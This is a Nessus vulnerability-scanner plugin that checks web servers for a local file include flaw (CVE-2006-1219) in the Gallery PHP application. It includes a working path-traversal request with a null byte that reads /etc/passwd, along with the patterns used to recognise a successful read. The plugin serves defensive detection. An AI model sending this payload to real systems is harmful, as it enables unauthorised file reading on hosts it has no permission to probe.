#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple local file include flaws. 

Description :

The remote host is running Gallery, a web-based photo album
application written in PHP. 

The version of Gallery installed on the remote host fails to sanitize
input to the 'stepOrder' parameter of the 'upgrade/index.php' and
'install/index.php' scripts before using it in a PHP 'require()'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
affect host provided PHP's 'register_globals' setting is enabled. 

See also :

http://www.nessus.org/u?8626cc0e
http://gallery.menalto.com/2.0.4_and_2.1_rc_2a_update

Solution :

Disable PHP's 'register_globals' setting, delete the application's
'upgrade/index.php' script, or upgrade to Gallery version 2.0.4 /
2.1-RC-2a or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description) {
  script_id(21040);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1219");
  script_bugtraq_id(17051);

  script_name(english:"Gallery stepOrder Parameter Local File Include Vulnerabilities");
  script_summary(english:"Tries to read a file using Gallery stepOrder parameter");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/gallery", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/upgrade/index.php?",
      "stepOrder[]=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(pattern:"main\(.+/etc/passwd\\0Step\.class.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening required '.+/etc/passwd\\0Step\.class'", string:res)
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      contents = res - strstr(res, "<br ");

    if (isnull(contents)) report = desc;
    else {
     report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_note(port:port, data:report);
    exit(0);
  }
}
